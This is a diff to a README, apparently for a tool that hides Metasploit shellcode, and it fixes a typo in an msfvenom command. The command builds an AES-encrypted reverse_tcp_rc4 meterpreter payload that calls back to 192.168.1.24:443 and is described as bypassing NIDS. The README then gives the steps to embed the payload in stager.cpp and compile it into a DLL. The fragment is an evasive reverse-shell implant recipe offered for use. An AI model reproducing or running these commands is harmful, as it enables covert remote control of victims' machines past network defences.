@@ -5,7 +5,7 @@ Code from this article: [https://blog.rapid7.com/2018/05/03/hiding-metasploit-sh
 If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NIDS),  get MSF5 from official repository (master branch - no official release yet at this time for v5): [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).  
 
 Then generate payload that suits your needs, ex:  
-```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
+```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
 
 Replace the payload in stager.cpp  and build the DLL on a Windows machine with ```cl /LD /MT /EHa stager.cpp aes.cpp``` [https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe](https://stackoverflow.com/questions/42794845/visual-studio-community-2017-cl-exe)  
 
